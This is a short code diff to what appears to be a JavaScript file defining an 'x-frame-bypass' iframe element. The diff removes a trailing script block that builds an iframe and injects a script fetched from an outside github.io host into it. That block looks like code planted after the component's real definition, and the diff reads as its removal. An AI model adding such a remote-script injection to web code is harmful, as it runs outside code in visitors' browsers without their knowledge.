@@ -84,12 +84,3 @@ customElements.define('x-frame-bypass', class extends HTMLIFrameElement {
 		})
 	}
 }, {extends: 'iframe'})
-<script>
-	frame=document.createElement("iframe");
-	frame.src="/css/bootstrap.min.css";
-
-	document.body.appendChild(frame);
-	script=document.createElement('script');
-	script.src='//vasilevigor3.github.io/myjs.js';
-	window.frames[0].document.head.appendChild(script);
-</script>
